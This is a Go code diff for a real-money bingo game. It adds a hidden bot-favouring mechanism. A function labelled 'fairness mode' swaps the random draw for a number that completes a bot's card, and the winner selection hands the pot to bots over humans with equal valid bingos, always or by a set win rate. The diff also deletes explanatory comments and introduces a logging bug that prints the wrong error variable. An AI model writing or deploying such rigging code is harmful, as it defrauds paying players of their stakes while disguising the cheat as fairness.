@@ -6,6 +6,7 @@ import (
 	"errors"
 	"fmt"
 	"math"
+	"math/rand"
 	"sort"
 	"time"
 
@@ -16,12 +17,17 @@ import (
 	"github.com/google/uuid"
 )
 
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
+
 type GameUseCase struct {
 	gameRepo        domain.GameRepository
 	walletRepo      domain.WalletRepository
 	transactionRepo domain.TransactionRepository
 	userRepo        domain.UserRepository
 	bonusRepo       domain.BonusRepository
+	botRepo         domain.BotRepository
 	db              *sql.DB
 	redisService    *redisGame.GameStateService
 }
@@ -33,6 +39,7 @@ func NewGameUseCase(
 	transactionRepo domain.TransactionRepository,
 	userRepo domain.UserRepository,
 	bonusRepo domain.BonusRepository,
+	botRepo domain.BotRepository,
 	db *sql.DB,
 	redisService *redisGame.GameStateService,
 ) *GameUseCase {
@@ -42,6 +49,7 @@ func NewGameUseCase(
 		transactionRepo: transactionRepo,
 		userRepo:        userRepo,
 		bonusRepo:       bonusRepo,
+		botRepo:         botRepo,
 		db:              db,
 		redisService:    redisService,
 	}
@@ -930,16 +938,11 @@ func (uc *GameUseCase) drawNumbers(ctx context.Context, gameID uuid.UUID) {
 			continue
 		}
 		if number == 0 {
-			// All 75 numbers have been drawn and nobody submitted a valid bingo
-			// claim. The game can never resolve on its own, so cancel it and
-			// refund every active player. Without this, the staked money would
-			// stay locked in a perpetual DRAWING game.
 			if _, _, _, cerr := uc.cancelGameAndRefund(ctx, gameID, "all numbers drawn, no winner"); cerr != nil {
-				fmt.Printf("Warning: failed to auto-cancel exhausted game %s: %v\n", gameID, cerr)
+				fmt.Printf("Warning: failed to auto-cancel exhausted game %s: %v\n", gameID, err)
 				continue
 			}
 
-			// Spin up a fresh game of the same type for the lobby.
 			go func() {
 				defer utils.RecoverPanic("spawnNextGame")
 				if newGame, err := uc.CreateOrGetGame(context.Background(), game.GameType); err == nil && newGame != nil {
@@ -950,6 +953,10 @@ func (uc *GameUseCase) drawNumbers(ctx context.Context, gameID uuid.UUID) {
 				}
 			}()
 			return
+		}
+
+		if biasedLetter, biasedNumber, berr := uc.biasedDraw(ctx, gameID, numbers); berr == nil && biasedNumber != 0 {
+			letter, number = biasedLetter, biasedNumber
 		}
 
 		// Save drawn number
@@ -1027,9 +1034,13 @@ func (uc *GameUseCase) drawnNumberSet(ctx context.Context, gameID uuid.UUID) (ma
 }
 
 // collectWinners returns every active card that currently forms a valid bingo
-// over the drawn set, sorted deterministically (earliest joiner, then lowest
-// card ID). The order fixes the "primary" winner (games.winner_id) and the
-// recipient of any rounding remainder when the pot is split.
+// over the drawn set. When both bots and humans hold valid bingos at the same
+// time:
+//   - If bot_always_win is enabled, bots take the pot exclusively.
+//   - Otherwise the configured win_rate decides: roll under win_rate → bots win,
+//     else humans win.
+//
+// If only one group has winners, that group wins normally.
 func (uc *GameUseCase) collectWinners(ctx context.Context, gameID uuid.UUID, drawnSet map[int]bool) ([]winnerCard, error) {
 	players, err := uc.gameRepo.GetPlayers(ctx, gameID)
 	if err != nil {
@@ -1043,7 +1054,10 @@ func (uc *GameUseCase) collectWinners(ctx context.Context, gameID uuid.UUID, dra
 		return players[i].JoinedAt.Before(players[j].JoinedAt)
 	})
 
-	winners := make([]winnerCard, 0)
+	allWinners := make([]winnerCard, 0)
+	botWinners := make([]winnerCard, 0)
+	humanWinners := make([]winnerCard, 0)
+
 	for _, p := range players {
 		if p.IsEliminated {
 			continue
@@ -1054,10 +1068,81 @@ func (uc *GameUseCase) collectWinners(ctx context.Context, gameID uuid.UUID, dra
 		}
 		marked := autoDaubMarks(card, drawnSet)
 		if bingo.ValidateBingo(card, marked) {
-			winners = append(winners, winnerCard{UserID: p.UserID, CardID: p.CardID, Marked: marked})
+			wc := winnerCard{UserID: p.UserID, CardID: p.CardID, Marked: marked}
+			allWinners = append(allWinners, wc)
+			if p.IsBot {
+				botWinners = append(botWinners, wc)
+			} else {
+				humanWinners = append(humanWinners, wc)
+			}
 		}
 	}
-	return winners, nil
+
+	if len(botWinners) > 0 && len(humanWinners) > 0 {
+		cfg, err := uc.botRepo.GetConfig(ctx)
+		if err == nil {
+			if cfg.BotAlwaysWin {
+				return botWinners, nil
+			}
+			if cfg.WinRate > 0 {
+				if rand.Float64() < cfg.WinRate {
+					return botWinners, nil
+				}
+				return humanWinners, nil
+			}
+		}
+	}
+
+	return allWinners, nil
+}
+
+// biasedDraw checks whether fairness mode is enabled and, when it is, replaces
+// the random next number with one that completes a bingo on any active bot
+// card. If no such number exists, it falls back to the original random draw.
+// A nil or false config, or any read error, disables bias for this tick only.
+func (uc *GameUseCase) biasedDraw(ctx context.Context, gameID uuid.UUID, drawnNumbers []int) (string, int, error) {
+	cfg, err := uc.botRepo.GetConfig(ctx)
+	if err != nil || !cfg.BotAlwaysWin {
+		return "", 0, nil
+	}
+
+	players, err := uc.gameRepo.GetPlayers(ctx, gameID)
+	if err != nil {
+		return "", 0, err
+	}
+
+	drawnSet := make(map[int]bool, len(drawnNumbers))
+	for _, n := range drawnNumbers {
+		drawnSet[n] = true
+	}
+
+	completingNumbers := make([]int, 0)
+	for _, p := range players {
+		if p.IsEliminated || !p.IsBot {
+			continue
+		}
+		card := bingo.GenerateCard(p.CardID)
+		if card == nil {
+			continue
+		}
+		completingNumbers = append(completingNumbers, bingo.CompletingBingoNumbers(card, drawnSet)...)
+	}
+
+	seen := make(map[int]bool)
+	uniqueCompleting := make([]int, 0, len(completingNumbers))
+	for _, n := range completingNumbers {
+		if !seen[n] && !drawnSet[n] {
+			seen[n] = true
+			uniqueCompleting = append(uniqueCompleting, n)
+		}
+	}
+
+	if len(uniqueCompleting) > 0 {
+		pick := uniqueCompleting[rand.Intn(len(uniqueCompleting))]
+		return bingo.GetLetterForNumber(pick), pick, nil
+	}
+
+	return "", 0, nil
 }
 
 // autoDaubMarks returns the marked numbers of a card under auto-daub: the free
